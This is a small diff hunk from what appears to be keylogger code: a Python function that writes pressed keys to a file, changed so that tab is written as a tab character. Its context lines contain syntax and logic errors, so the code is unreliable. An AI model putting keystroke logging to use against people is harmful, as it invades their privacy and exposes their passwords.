@@ -33,7 +33,7 @@ def write_on_file(pressed_keys):
         f.write('\n')
         
       elif(x.find("tab")) > 0: # when tab is pressed is pressed to create two spaces
-        f.write('  ')
+        f.write('\t')
               
       elif(x.find("Key") == -1:
         f.write(x)
